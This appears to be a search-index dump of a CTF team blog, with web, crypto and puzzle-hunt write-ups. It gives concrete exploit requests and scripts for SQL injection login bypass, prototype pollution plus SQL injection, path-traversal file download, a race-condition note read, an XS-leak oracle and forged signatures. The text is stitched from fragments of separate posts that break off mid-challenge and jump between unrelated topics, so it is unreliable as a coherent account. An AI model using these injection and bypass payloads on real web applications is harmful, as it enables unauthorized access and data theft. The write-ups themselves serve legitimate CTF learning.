[{"content":"Because there are not many Crypto listed in the \u0026quot;Stock Market\u0026quot;, our Cryptotrader Cryptanalyst Mystiz joined us for bounty hunting in Web as well, and we got all Web challenges done this time.\ntrading-api ($285, 20 solves) The objective of this challenge is to get the flag from a PostgreSQL database. First, you need to get an auth token before accessing the API with SQL queries.\n// server.js app.post(\u0026#39;/api/auth/login\u0026#39;, login); // authn.js const r = await got.post(`${AUTH_SERVICE}/api/users/${encodeURI(username)}/auth`, { headers: { authorization: AUTH_API_TOKEN }, json: { password }, }); Well encodeURI not encodeURIComponent? I didn't even bother to read the auth service API and try the username with ../../health? and it works!\nThen there is an annoying checking on the /api/priv/ endpoint:\napp.use(authz({ userPermissions: new Map(Object.entries({ warrenbuffett69: [Permissions.VERIFIED], })), routePermissions: [ [/^\\/+api\\/+priv\\//i, Permissions.VERIFIED], ], })); I thought we need to craft another JWT token (JSON Web Token token?) with the username warrenbuffett69 but apparently we also need a funnier username (../../health? is not funny enough) to do SQLi next.\n(Mystiz actually found the SQLi already because we can bypass this shit) After several hours of fuzzing, none of those .. or weird unicode works as expected. And then I tried to check how express checks the route but I have no idea. Instead I found this: https://github.com/expressjs/express/blob/master/lib/router/index.js#L190\nWhy there is protohost in req.url? Then I tried http://z/api/priv/ (instead of /api/priv/) as the request URL and it works! (Typically, proxy server will accept absolute path as URL1)\nFinally it is the main dish:\napp.put(\u0026#39;/api/priv/assets/:asset/:action\u0026#39;, async (req, res) =\u0026gt; { const { username } = req.user const { asset, action } = req.params; if (/[^A-z]/.test(asset)) { return res.status(400).send(\u0026#39;asset name must be letters only\u0026#39;); } const assetTransactions = transactions[asset] ?? (transactions[asset] = {}); const txId = generateId(); assetTransactions[txId] = action; try { await makeTransaction(username, txId, asset, action === \u0026#39;buy\u0026#39; ? 1 : -1); res.json({ id: txId }); } catch (error) { console.error(\u0026#39;db error:\u0026#39;, error.message); res.status(500).send(\u0026#39;transaction failed\u0026#39;); } finally { delete assetTransactions[txId]; } }); async function makeTransaction(username, txId, asset, amount) { const query = prepare(\u0026#39;INSERT INTO transactions (id, asset, amount, username) VALUES (:txId, :asset, :amount, :username)\u0026#39;, { amount, asset, username, txId, }); await db.query(query); } Uh-oh prepared statement... Let's see how it works:\nfunction sqlEscape(value) { switch (typeof value) { case \u0026#39;string\u0026#39;: return `\u0026#39;${value.replace(/[^\\x20-\\x7e]|[\u0026#39;]/g, \u0026#39;\u0026#39;)}\u0026#39;`; case \u0026#39;number\u0026#39;: return isFinite(value) ? String(value) : sqlEscape(String(value)); case \u0026#39;boolean\u0026#39;: return String(value); default: return value == null ? \u0026#39;NULL\u0026#39; : sqlEscape(JSON.stringify(value)); } } function prepare(query, namedParams) { let filledQuery = query; const escapedParams = Object.fromEntries( Object.entries(namedParams) .map(([key, value]) =\u0026gt; ([key, sqlEscape(value)])) ); for (const key in escapedParams) { filledQuery = filledQuery.replaceAll(`:${key}`, escapedParams[key]); } return filledQuery; } sqlEscape will eat the single quote from your string input (and add a pair of single quote), so changing the username (or asset) to ../../health?' blah will not work. No luck? When you see a lot of Objects[key] (having Object[key1][key2] is the best) in a js challenge, you can try prototype pollution:\nconst assetTransactions = transactions[asset] ?? (transactions[asset] = {}); const txId = generateId(); assetTransactions[txId] = action; which is just like transactions[asset][txId] = action; which fits the Object[key1][key2] form, then we can just fill key1 as __proto__ and we can control asset and action as a string. So we got a prototype pollution on a property of ... a generated ID... but this prototype property will be appeared in escapedParams as well, so if we know the ID (e.g. 1337), then having the username as ../../health? :1337 with action ' blah -- will make the SQL statement looks like\nINSERT INTO transactions (id, asset, amount, username) VALUES (1337, \u0026#39;__proto__\u0026#39;, -1, \u0026#39;../../health? \u0026#39; blah --\u0026#39;) (I know it is broken lol) But how can we get the generated ID? You can't before it shows the result... so instead of putting :1337 as the placeholder, we can put ::txId as the placeholder, so that it will be replaced to the placeholder for the generated ID later.\nTo sum up:\n Get a token with a funny username that contains ::txId, e.g. ../../health? ::txId Access the /api/priv/ endpoint with prototype pollution and SQLi while bypassing the check: PUT http://z/api/priv/assets/__proto__/'%7C%7C(select%09flag%09from%09flag)%7C%7C' HTTP/1.1 Authorization: eySomeToken Host: z ?? Profit  Then you can use the /api/transactions/:id endpoint with the generated ID shown in the transaction result to get the flag.\nBookmarker ($333, 14 solves) Note App + XSS Bot again. But apparently there is no XSS. There is a filter function:\nlet username = req.session.username let {filter} = req.query let query = {username} if(filter){ query.title = { $regex: escapeStringRegexp(filter) } } let items = await Links.find(query).sort({date: -1}) Regular Expression Filter, ReDoS again? But wait there is escapeStringRegexp which seems to be working well. So we need other oracle to check whether the admin's bookmark title (i.e. the flag) contains certain character. Then I found that there is a subtle difference in index.ejs:\n\u0026lt;% if(typeof items != \u0026#39;undefined\u0026#39; \u0026amp;\u0026amp; items.length){ %\u0026gt; \u0026lt;script\u0026gt; window.onload = () =\u0026gt; { document.querySelectorAll(\u0026#39;.deletebtn\u0026#39;).forEach((button)=\u0026gt; { button.onclick = async () =\u0026gt; { // delete link with id  fetch(`/delete?id=${button.dataset.id}`, { method: \u0026#39;GET\u0026#39;, credentials: \u0026#39;include\u0026#39;, }) .then(x =\u0026gt; x.json()) .then((j) =\u0026gt; { console.log(j) }) // remove from dom  button.parentElement.parentElement.parentElement.remove() } }) } \u0026lt;/script\u0026gt; \u0026lt;% } %\u0026gt; That means if the query got no results, it won't include the script for deleting link. Now we can add more security protection to the page, and then we can use our favorite censorship oracle (i.e. Streisand effect) to detect what are the interesting information... lol\nNot blocked:\n\u0026lt;iframe src=\u0026#34;https://bookmarker.flu.xxx/?filter=not_found\u0026#34; csp=\u0026#34;script-src \u0026#39;none\u0026#39;\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; Blocked:\n\u0026lt;iframe src=\u0026#34;https://bookmarker.flu.xxx/?filter=found\u0026#34; csp=\u0026#34;script-src \u0026#39;none\u0026#39;\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; The oracle here is the blocked one will be loaded relatively faster.

Let's see how did it prepare:\npublic static function prepare($query, $args){ if (is_null($query)){ return; } if (strpos($query, \u0026#39;%\u0026#39;) === false){ error(\u0026#39;%s not included in query!\u0026#39;); return; } // get args  $args = func_get_args(); array_shift( $args ); $args_is_array = false; if (is_array($args[0]) \u0026amp;\u0026amp; count($args) == 1 ) { $args = $args[0]; $args_is_array = true; } $count_format = substr_count($query, \u0026#39;%s\u0026#39;); if($count_format !== count($args)){ error(\u0026#39;Wrong number of arguments!\u0026#39;); return; } // escape  foreach ($args as \u0026amp;$value){ $value = static::$db-\u0026gt;real_escape_string($value); } // prepare  $query = str_replace(\u0026#34;%s\u0026#34;, \u0026#34;\u0026#39;%s\u0026#39;\u0026#34;, $query); $query = vsprintf($query, $args); return $query; } Since the statement is prepared twice (one for the password and the other one for username), obviously it is format string placeholder injection. Typically it is injecting %c with value 39 to add one more single quote to break everything, but the above prepare function also checks whether the number of %s and the number of arguments supplied match, so we need to inject another %s if we want to make sure the vsprintf works later.\nFirst, the statement looks like this before prepare on password:\nSELECT * FROM `users` where password=sha1(%s) Let's just set the password as %s, then it will become like this after the vsprintf:\nSELECT * FROM `users` where password=sha1(\u0026#39;%s\u0026#39;) Looks no difference? See where are the single quotes...\nThen we have another prepare statement for the username. Before it prepare:\nSELECT * FROM `users` where password=sha1(\u0026#39;%s\u0026#39;) and name=%s Now you should see what went wrong. Let's say we supply the username as ['foo','bar'], the statement will become:\nSELECT * FROM `users` where password=sha1(\u0026#39;\u0026#39;foo\u0026#39;\u0026#39;) and name=\u0026#39;bar\u0026#39; Looks broken isn't it? Then it is like SQLi 101, just change the foo to some interesting things like ) or 1 --, then you can login:\ncurl https://diamond-safe.flu.xxx/login.php -d \u0026#34;name[]=) or 1 -- \u0026amp;name[]=1\u0026amp;password=%s\u0026#34; -i Next, we want to download the flag. But there is an integrity check on the filename with the hash:\nfunction check_url(){ // fixed bypasses with arrays in get parameters  $query = explode(\u0026#39;\u0026amp;\u0026#39;, $_SERVER[\u0026#39;QUERY_STRING\u0026#39;]); $params = array(); foreach( $query as $param ){ // prevent notice on explode() if $param has no \u0026#39;=\u0026#39;  if (strpos($param, \u0026#39;=\u0026#39;) === false){ $param += \u0026#39;=\u0026#39;; } list($name, $value) = explode(\u0026#39;=\u0026#39;, $param, 2); $params[urldecode($name)] = urldecode($value); } if(!isset($params[\u0026#39;file_name\u0026#39;]) or !isset($params[\u0026#39;h\u0026#39;])){ return False; } $secret = getenv(\u0026#39;SECURE_URL_SECRET\u0026#39;); $hash = md5(\u0026#34;{$secret}|{$params[\u0026#39;file_name\u0026#39;]}|{$secret}\u0026#34;); if($hash === $params[\u0026#39;h\u0026#39;]){ return True; } return False; } Why use the query string instead of $_GET... Looks like a bad excuse for the comment. Anyway we can just keep the original file_name and h in the query string for a valid file, and then add something that can replace the $_GET['file_name']. One way is file name as PHP replaces space with underscore from query string to $_GET:\nhttps://diamond-safe.flu.xxx/download.php?h=f2d03c27433d3643ff5d20f1409cb013\u0026amp;file_name=FlagNotHere.txt\u0026amp;file%20name=../../../flag.txt NodeNB ($198, 45 solves) The objective is to read the note with id flag. However, there is an authorization and you are allowed to read the flag only if either\n you are the owner of the note (there are no owners for the note flag), or you do not have a password (this happens only if you are a system user).  async deleteUser(uid) { const user = await helpers.getUser(uid); await db.set(`user:${user.name}`, -1); await db.del(`uid:${uid}`); // ☝️ Deletes the entire user. The user does not have a password now.  const sessions = await db.smembers(`uid:${uid}:sessions`); const notes = await db.smembers(`uid:${uid}:notes`); return db.del([ ...sessions.map((sid) =\u0026gt; `sess:${sid}`), // ☝️ The sessions are invalidated here  ...notes.map((nid) =\u0026gt; `note:${nid}`), `uid:${uid}:sessions`, `uid:${uid}:notes`, ]); }, Mystiz observed that there is a gap between deleting the user and invalidating the sessions. A user can read arbitrary notes during the time in between. To achieve this, he tried to increase the time by inserting a lot of notes (he attempted to make 1024 notes) and delete the user. Unfortunately he was unable to cast the attack.\nActually there is a sleep function in one of the endpoint that could help us to conduct the race condition attack:\napp.post(\u0026#39;/notes\u0026#39;, ensureAuth, async (req, res) =\u0026gt; { let { title, content } = req.body; if (req.query.random) { const ms = Math.floor(2000 + Math.random() * 1000); await new Promise(r =\u0026gt; setTimeout(r, ms)); So instead of inserting tons of notes (which should work theoretically if the amount is very large), we can just request a few random notes that will sleep for a while. Then we can run delete and read at the same time:\nfor(i=0;i\u0026lt;100;i++){fetch(\u0026#39;/notes?random=1\u0026#39;,{\u0026#39;method\u0026#39;:\u0026#39;POST\u0026#39;,\u0026#39;headers\u0026#39;:{\u0026#39;content-type\u0026#39;:\u0026#39;application/x-www-form-urlencoded\u0026#39;},\u0026#39;body\u0026#39;:\u0026#39;title=\u0026#39;+Math.random()})}; fetch(\u0026#39;/deleteme\u0026#39;,{\u0026#39;method\u0026#39;:\u0026#39;POST\u0026#39;}); fetch(\u0026#39;/notes/flag\u0026#39;).then(e=\u0026gt;e.text()).then(e=\u0026gt;console.log(e)); SeekingExploits ($367, 11 solves) The challenge is written based on an open source forum, MyBB. A plugin called ExploitMarket is implemented. There are two APIs implemented:\n make_proposal makes a proposal delete_proposals clears the proposal of the current user.  Additionally, when a user sends a private message to another user, the list of proposals will be included as a signature.\nThe flag is hidden inside the database. It is hidden in the private notes of the admin. That said, we need to either sign in as an admin (which sounds infeasible for a public CMS) or perform SQL injection.\nIn mybb-server/exploit_market/inc/plugins/emarket.php, there is an obvious SQL injection:\n$user_query = $db-\u0026gt;simple_select(\u0026#34;users\u0026#34;, \u0026#34;username\u0026#34;, \u0026#34;uid=\u0026#34; . $proposal[\u0026#34;additional_info\u0026#34;][\u0026#39;sold_to\u0026#39;]); additional_info is unserialized with my_unserialize and sold_to is used directly without validation. That said, if sold_to is a string, we can easily craft an SQL injection easily (the insert_query function in MyBB simply concatenates the function parameters).\nUnfortunately the fields in additional_info are validated when the content is added. Snippeted:\nfunction validate_additional_info($additional_info) { $validated = array(); foreach($additional_info as $key =\u0026gt; $value) { switch ($key) { case \u0026#34;reliability\u0026#34;: { $value = (int)$value; if ($value \u0026gt;= 0 \u0026amp;\u0026amp; $value \u0026lt;= 100) { $validated[\u0026#34;reliability\u0026#34;] = $value; } break; } case \u0026#34;impact\u0026#34;: { $valid_impacts = array(\u0026#34;rce\u0026#34;, \u0026#34;priv_esc\u0026#34;, \u0026#34;information_disclosure\u0026#34;); if (in_array($value, $valid_impacts, true)) { $validated[\u0026#34;impact\u0026#34;] = $value; } break; } case \u0026#34;current_bidding\u0026#34;: case \u0026#34;sold_to\u0026#34;: { $validated[$key] = (int)$value; break; } default: { $validated[$key] = $value; } } } return $validated; } Although the keys other than reliability, impact, current_bidding and sold_to are not validated and will be added to the return object directly for serialization, only sold_to is shown to the user. It seemed that every other key except sold_to are not important because they do not affect the rendered result... or is it?\nThese (un)serialization will use _safe_unserialize / _safe_serialize, which look safe (as the name suggested lol). Then how can we have a sold_to with SQLi payload after unserialize while bypassing the check during the serialization? Maybe there are some mutation when it writes to the database and reads differently afterwards. A typically case is data truncation in SQL, but the column data type here is TEXT, and also having a left substring of the serialized string seems not very helpful in crafting a nice payload that changes the sold_to later.\nMaybe it is about Multibyte character exploit? Sounds like the infamous 許功蓋 in the 90s. Just randomly add some characters from [\\x80-\\xff] and see what's going on:\nhttp://seekingexploits.flu.xxx/emarket-api.php?action=make_proposal\u0026amp;additional_info[%ee]=1\u0026amp;additional_info[sold_to]=1 This will make the buyer empty (instead of Admin), meaning it breaks the serialized string in some way.\nThen we observe what is the actual serialized string looks like for different cases:\nadditional_info[e%ee]=1\u0026amp;additional_info[sold_to]=1:\na:2:{s:2:\u0026#34;e?;s:1:\u0026#34;1\u0026#34;;s:7:\u0026#34;sold_to\u0026#34;;i:1;} additional_info[%ee%ee]=1\u0026amp;additional_info[sold_to]=1:\na:2:{s:2:\u0026#34;?\u0026#34;;s:1:\u0026#34;1\u0026#34;;s:7:\u0026#34;sold_to\u0026#34;;i:1;} As you can see, the length of first string is the number of bytes we entered but the output may contain something less than that. So basically we need to craft a serialized string that will unserialized to Array(\u0026quot;somejunk1\u0026quot;=\u0026gt;\u0026quot;somejunk2\u0026quot;,\u0026quot;sold_to\u0026quot;=\u0026gt;\u0026quot;payload\u0026quot;)\nHow? I don't know... Just do some trial and error. Before I finish crafting, Mystiz has already got a working payload:\nhttp://seekingexploits.flu.xxx/emarket-api.php?action=make_proposal\u0026amp;additional_info[%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ec]=%22;s:0:%22%22;s:7:%22sold_to%22;s:53:%22-1%20union%20select%20usernotes%20from%20mybb_users%20where%20uid=1\u0026amp;additional_info[%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee]=1\u0026amp;additional_info[%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ee%ef]=2 which looks like\na:3:{s:8:\u0026#34;?;s:82:\u0026#34;\u0026#34;;s:0:\u0026#34;\u0026#34;;s:7:\u0026#34;sold_to\u0026#34;;s:53:\u0026#34;-1 union select usernotes from mybb_users where uid=1\u0026#34;;s:15:\u0026#34;????????;s:1:\u0026#34;1\u0026#34;;s:15:\u0026#34;????????;s:1:\u0026#34;2\u0026#34;;} Looks horrible isn't it? Somehow it includes the serialized string s:7:\u0026quot;sold_to\u0026quot;;s:(some_number):\u0026quot;some_payload\u0026quot; inside one of the input.

The writeup of the web challenges can be found here.\nlwsr ($285, 20 solves) Challenge Summary Suppose that $q = 16411$.\nWhen connected to the server, a LWE private key $s \\in \\mathbb{Z}_q^{128}$ and 384 sets of public key $(p_1, r_1), (p_2, r_2), ..., (p_{384}, r_{384}) \\in \\mathbb{Z}_q^{128} \\times \\mathbb{Z}_q$ are also generated. Also, a LFSR state $t = (t_1, t_2, ..., t_{384})$ with $t_1, t_2, ..., t_{384} \\in \\{0, 1\\}$ is generated.\nThe flag is encrypted bit-by-bit. The ciphertext of the $i$-th bit of the message, $m_i$, is defined by:\n\\[\\begin{cases} c_{i, 0} \u0026= (t_1 \\cdot p_1 + t_2 \\cdot p_2 + ... + t_{384} \\cdot p_{384})\\ \\text{mod}\\ q \\\\ c_{i, 1} \u0026= (t_1 \\cdot r_1 + t_2 \\cdot r_2 + ... + t_{384} \\cdot r_{384} + 8205m_i)\\ \\text{mod}\\ q \\end{cases}\\]\nAdditionally, after a bit is encrypted, the LFSR state is updated with\n\\[(t'_1, t'_2, ..., t'_{384}) := \\left(t_2, t_3, ..., \\text{NEXT}(t_1, t_2, ..., t_{384})\\right).\\]\nWe are given $(p_1, r_1), (p_2, r_2), ..., (p_{384}, r_{384})$ and encrypted flag $(c_{1,0}, c_{1,1}), (c_{2,0}, c_{2,1}), ...$. We are then able to access the decryption oracle. The goal is to recover the flag.\nSolution Denote $p_i = (p_{i, 1}, p_{i, 2}, ..., p_{i, 128})$ and $c_{k, 0} = (c_{k, 0, 1}, c_{k, 0, 2}, ..., c_{k, 0, 128})$ with $p_{i, j}, c_{k, 0, j} \\in \\mathbb{Z}_q$. Let's make $c_{1, 0, j}$ in terms of $p_{i, j}$'s:\n\\[c_{1, 0, j} = (t_1 \\cdot p_{1, j} + t_2 \\cdot p_{2, j} + ... + t_{384} \\cdot p_{384, j})\\ \\text{mod}\\ q.\\]\nNow we have 128 equations with unknowns $t_1, t_2, ..., t_{384}$. Denote\n\\[t_{k+385} := \\text{NEXT}(t_{k+1}, t_{k+2}, ..., t_{k+384})\\]\nfor $k \\geq 0$, then we have 384 equations when we consider $c_{2, 0, j}$, $c_{3, 0, j}$ and $c_{4, 0, j}$:\n\\[\\begin{aligned} c_{2, 0, j} = (t_2 \\cdot p_{1, j} + t_3 \\cdot p_{2, j} + ... + t_{385} \\cdot p_{384, j})\\ \\text{mod}\\ q, \\\\ c_{3, 0, j} = (t_3 \\cdot p_{1, j} + t_4 \\cdot p_{2, j} + ... + t_{386} \\cdot p_{384, j})\\ \\text{mod}\\ q, \\\\ c_{4, 0, j} = (t_4 \\cdot p_{1, j} + t_5 \\cdot p_{2, j} + ... + t_{387} \\cdot p_{384, j})\\ \\text{mod}\\ q. \\end{aligned}\\]\nSince we have 387 unknowns $(t_1, t_2, ..., t_{387})$ and 512 equations, we can recover $(t_1, t_2, ..., t_{387})$ by solving the linear system under modulo $q$. With that, we can substitute the unknowns to $c_{i, 1}$'s to recover the flag.\ndef lfsr(state): # x^384 + x^8 + x^7 + x^6 + x^4 + x^3 + x^2 + x + 1 mask = (1 \u0026lt;\u0026lt; 384) - (1 \u0026lt;\u0026lt; 377) + 1 newbit = bin(state \u0026amp; mask).count(\u0026#39;1\u0026#39;) \u0026amp; 1 return (state \u0026gt;\u0026gt; 1) | (newbit \u0026lt;\u0026lt; 383) # ============ q = 16411 Fq = GF(q) # sample.log includes a simple transcript connecting to the server. with open(\u0026#39;sample.log\u0026#39;) as f: lines = f.readlines() pk = eval(lines[1]) outputs = [] for line in lines[3:355]: outputs.append(eval(line)) A = Matrix(Fq, 512, 387) y = vector(Fq, 512) for i, (a, b) in enumerate(outputs[:4]): for j in range(128): A[128*i+j, :] = vector(Fq, [0 for _ in range(i)] + [pk[k][0][j] for k in range(384)] + [0 for _ in range(3-i)]) y[128*i+j] = a[j] x = A.solve_right(y) state1 = sum(int(x[i+0])\u0026lt;\u0026lt;i for i in range(384)) state2 = sum(int(x[i+1])\u0026lt;\u0026lt;i for i in range(384)) state3 = sum(int(x[i+2])\u0026lt;\u0026lt;i for i in range(384)) state4 = sum(int(x[i+3])\u0026lt;\u0026lt;i for i in range(384)) assert lfsr(state1) == state2 assert lfsr(state2) == state3 assert lfsr(state3) == state4 pk_right = [pk[k][1] for k in range(384)] state = state1 flag = 0 for (a, b) in outputs: flag *= 2 if (sum(pk_right[i] * ((state\u0026gt;\u0026gt;i) \u0026amp; 1) for i in range(384)) - b) % q != 0: flag += 1 state = lfsr(state) flag = int(flag) print(int.to_bytes(flag, len(outputs)//8, \u0026#39;big\u0026#39;)) WhatTheHecc ($198, 45 solves) Challenge Summary The challenge defines a signature algorithm $\\mathcal{S}$, where a key generated with elliptic curve parameter P-256 (the public and private keys are respectively $Q$ and $d$). The signing algorithm for a message $m$ is specified below ($\\text{H}$ is the SHA3-256 algorithm that returns an integer given an array of bytes):\n Compute $r = \\text{H}(m) \\cdot Q$ Compute $r' = r\\cdot d^{-1}\\ \\text{mod}\\ q$, where $q$ is the order of the curve Define $z = n_\\text{nonce} | t$, where $n_\\text{once} \\in [1, q)$ and $t$ is the timestamp in seconds Compute $R = r' + \\text{H}(z) \\cdot G$ Compute $s = [d - \\text{H}(z)]\\ \\text{mod}\\ q$ Return $(R, s)$ as the signature.  Also the verifying algorithm for a message $m$ and signature $(R, s)$:\n If $s = 0\\ \\text{or}\\ 1$ and $s \u0026gt; 0$ then the signature is considered invalid. The signature is valid only if  \\[s \\cdot G - Q + R = \\text{H}(m) \\cdot G\\]\nThere are three functions those we can use when connected to the server:\n [Show] Prints the public key. [Sign] Signs one of the four commands: id, uname, ls and date with $\\mathcal{S}$. [Run] Takes a signed command and executes if the signature is valid.  Solution The verify method they implemented is really fishy:\ndef verify(msg, sig, pub): R, s = sig # 👇 This is sus if s in [0,1,\u0026#39;\u0026#39;] and s \u0026gt; 0: return False tmp1 = s * pub._curve.G tmp2 = - pub.pointQ tmp3 = tmp2 + R return tmp1 + tmp3 == hash(msg) * pub._curve.G From the line specified, it seemed to me that $s$ should be nonzero. I tried putting $s = 0$ and found $R = Q + \\text{H}(m)$. That said, we can simply send $(R, s) = (Q + \\text{H}(m), 0)$ as an signature to execute arbitrary commands. With that said, we can simply craft a signature for cat flag and read the flag.\nPostmortem $\\mathcal{S}$ is not secure at all. It does not help even if $s \\neq 0$ is enforced. $R$ can be easily crafted given arbitrary $m$ and $s$:\n\\[R = [\\text{H}(m) - s] \\cdot G + Q\\]\nFor instance, @RBTree_ could execute arbitrary commands with $(R, s) = (Q, \\text{H}(m))$.\n","permalink":"https://b6a.black/posts/2021-11-04-hacklu-crypto/","summary":"Because there are not many Crypto listed in the \u0026quot;Stock Market\u0026quot;, I decided to join our \u003cdel\u003eWebb-expert\u003c/del\u003e Web-expert \u003cem\u003eOzetta\u003c/em\u003e for bounty hunting in web, and we got all web challenges done this time.

Since it mentions 1GHz, the time should be correct to one nanosecond, which is what we have now. When converted to a number, it is 1560805286250791.\nMystiz tried to convert the number in base 26 and 256 but did not have a proper result. However, noticing the SemiSeptemvigesimal in the clock, he converted the number into base 27 (7 15 18 9 14 7 0 7 15 1 20).

Split Meanings Challenge Link\n I stumbled upon the most peculiar coincidence. Or was it a coin cidence? Or a Coinci dence??\nOnce you've separated heads from tails, don't forget to use the passages for spot all-stars... or was it a result of points...\n Solution ⌛ Progress: 5/11 ⌛\n🎉 Solved on August 8, 00:55 (23h 55m after the game starts) 🎉 We had no idea what was going on. Mystiz guessed that the first hint starts with dig because of the word excavating. TWY thought that should be digest, and eventually got the first solution: dig estate / digest ate.\nOn the second trial, TWY suggested that the last one ends with terrain.\n Mystiz: win terrain / winter rain? TWY: bet terrain / better rain!\n We eventually solved most of them. While we are solving, assuming that the middle part consists of three letters also helped us to solve the harder ones:\nRatio of law enforcement OR a penny (10) cop percent / copper cent In addition to nature OR having no exit (12) with outdoors / without doors [*] Island of a large island OR location for work (10) off iceland / office land [*] Jewelry for phone icons OR suddenly visible circles (11) app earrings / appear rings Alice’s vote OR a bundle of rosemary (9) her ballot / herbal lot Planter for particles OR spud speaking device (9) pot atomic / potato mic Expert demonstration OR correct posture (10) pro perform / proper form Excavating an inheritance OR consuming an processing (9) dig estate / digest ate Tasting tin OR master of the shiny elements (12) metal licking / metallic king Laws pertaining to a flying mammal OR a night out with the caped crusader (10) bat mandate / batman date Gambling field OR more welcome precipitation (10) bet terrain / better rain [*]: Answers provided by the puzzle setter. There are a bunch of unused triples. For that, we extract the three letters in the middle part and compute a product-sum for each of the triples.\nFor the first line, the middletext is per (that is $(16, 5, 18)$) and the triple is $(-2, 1, 2)$. We can compute i (which is a $9$) with the below formula:\n\\[(-2)\\cdot 16 + 1\\cdot 5 + 2\\cdot 18 = 9\\]\nRepeating the progress, we had the flag.\nFlag: ivoryequine (so the adjective and the noun doesn't start with the same letter)\nInconvenient Habit of Kittens Challenge Link\nSolution ⌛ Progress: 6/11 ⌛\n🎉 Solved on August 8, 04:15 (1d 3h 15m after the game starts) 🎉 We are given a sound file of meow's and purr's, some follows immediately after the previous sound, some with a short pause and some with a longer pause.\nWe first labelled and converted the sound file into the following text:\nr h atfd k@el !w b xig oc sj pu vhaf mdk el qbi zgn$ #yr oct @ jp! vwh xa s umq fdke lbz n$ i#yg r to@! wcj pvx su hmqa z nf$# dkyrel bt @i goc j!w p vxh sumafd kelb qzn i$g #o c yjp vhaf rt@ d!k elb i The maximum length is 6 and there are more than 26 different source of sounds.\n\nOkay, this is some sort of morse code.

Also, 303 Duovigintillion in the title hinted that we are going to build a big number eventually. Also, the line \u0026quot;After all, you wouldn't want to waste your PRIME FORM.\u0026quot; suggested us to factorize the numbers.\nWith the help of Google and the area code checker, we can build a huge number.\n\\[303559110...132800000 = 2^{20}\\cdot3^8\\cdot5^5\\cdot7^{18}\\cdot11^{15}\\cdot13^{19}\\cdot17^5.\\]\nConsidering the indices in the prime factorization, we got the answer for the next stage: TheRose.\nStage 3  Beware the Jabberwock, my son! The jaws that bite, the claws that catch! Beware the Jubjub bird, and shun The frumious Bandersnatch!\n \nThis stage is also easy. Searching the keywords dark, jot and cipher on Google, we are suggested that the above text is encoded in nyctography, created by Lewis Carroll.\n\nDecoding the text, we have the answer CheshireCat.\n😏 An Insight. Mystiz realised that these are all characters in the Alice in the Wonderland now\u0026hellip;  Stage 4  He took his vorpal sword in hand: Long time the manxome foe he sought - So rested he by the Tumtum tree, And stood awhile in thought.\n \nWe can see that there are a bunch of M\u0026amp;Ms in this stage. Similar to Knave of Hearts (which is not correct), Mystiz thought that it is ASCII related because there are eight columns and first column consists of zeroes only. This decodes into CountColors, and therefore the number of M\u0026amp;Ms are counted for each of the colors.\nwhite: 16 (p) red: 20 (t) pale-red: 3 (c) orange: 8 (h) yellow: 5 (e) green: 4 (d) blue: 21 (u) brown: 11 (k) ---------------- sum: 88 Mystiz tried to anagram with ptcheduk.

With that, Mystiz went through the characters and found Carpenter is the perfect match (he also found hammer bird but it was incorrect).\nUncertain bits. Mystiz thought sek je þe to be seek me the.  Stage 6  One, two! One, two! And through and through The vorpal blade went snicker-snack!

Assuming that the lengths given on the left are correct, then they are respectively haddock, squid, quahog, shrimp and king crab.\n💬 Puzzle Setter\u0026rsquo;s Comment. This is the sea animal people had the hardest time identifying. We tweeted a hint, \u0026ldquo;My third is hard shelled\u0026rdquo;, to help with that.  There is a line UEHKYHRIOSTEETEMDR on the very bottom. Using railfence cipher with two rows. It decrypts into USE THE KEY THERMIDOR. The rationale comes from the challenge statement - \u0026quot;Two lines!\u0026quot; cried the Mock Turtle.\nIn a later time, there is a hint regarding to the remaining part of the puzzle:\n\nMystiz identified that might be playfair cipher. However he was unsure what to decrypt (or encrypt). He decided to DM the puzzle writer and received:\n CryptoK — 2021/08/08\ntrust your intuition a bit more there\n Mystiz decided to look into playfair cipher. He initially thought the seven-letter word that ends with a T would be decrypted to haddock. This led him nowhere.\n\nAfter reassured by the puzzle writer, he tried to decrypt the pairs. For instance, we are using the seventh letter of haddock, i.e. K, along with the hint T. When it is decrypted with the key THERMIDOR, we have CR. The seventh letter of haddock is picked because T in the hint is the seventh letter.\nRepeating the process with the ciphertext pairs KT, DX, QT, IF, IR.

This is what we have after filling in the board:\n\nNote that there are multiple solutions for the nonogram. We marked them in pale orange and light blue - and either one serves as part of the correct answer along with the green squares.\nAfter that, we are long stuck. There are three hints released:\n If the Knave told you that he could feel the next step by closing his eyes, would you believe him? The knave's friend can move from his starting position to the opposite corner clockwise. Consider the unseen and the derived separately. From there, your journey continues where edges meet.  There are some thoughts while we are stuck. For instance, we think the the solution for nonogram is encoding ASCII characters column-by-column (which reads 5 53R1C#). We also guessed that each column is encoding a pair of coordinates (which decodes to $(3, 5)$, $(2, 0)$, $(3, 5)$, $(3, 3)$, ...). Unfortunately this led us to nowhere.\nBecause of the desperation, Mystiz DMed for hints once again and knew it was braille immediately:\n CryptoK — Aug 8 How might one read if they are wearing a blindfold?\n Decoding the nonogram solution with Braille, we obtained knightne (the another one does not decode into something meaningful).\n💬 Puzzle Setter\u0026rsquo;s Comment. This was also clued in the passage from Alice in Wonderland, \u0026ldquo;so that they couldn\u0026rsquo;t see it\u0026rdquo;.  It is stated from the second hint that the knight can move from one corner to the opposite clockwise. Which corners? What are the walkable squares?\nEventually, when we assume that the obstacles are defined by the given hints in sudoku, we are able to move from top-right to bottom-left clockwise.

Furthermore, we made some assumptions according to the poem regarding the \u0026quot;special\u0026quot; construction of the tree:\n \u0026quot;While counting the quill of characters expected within it\u0026quot; may be related to the letter frequencies \u0026quot;Left be less yielding naught\u0026quot; seems to imply that the left branch of the tree has smaller weight than the right branch, and the assigned bit is 0. \u0026quot;Hoofman's thoughts can’t see why one would want to multiply!?\u0026quot; seems to imply that multiply is used instead of addition. \u0026quot;Left and right form anew, but their sums over-grew??\u0026quot; is the basic concept of Huffman tree, and \u0026quot;over-grew\u0026quot; emphasizes the growth rate of the weight after merging. \u0026quot;That's optimally not right when compressing.\u0026quot; implies that the implementation is different from the optimal Huffman tree construction.  There are some more questions regarding to the third point. If we are using multiplication instead of addition, we need to consider whether \u0026quot;the quill\u0026quot; means the count or the percentage. If it is the latter case, then multiplying two numbers should result in a smaller fraction, so we should instead take the two nodes with highest weights (We thought of whether \u0026quot;Wonder through and reflect?\u0026quot; is related). Otherwise, if it is the 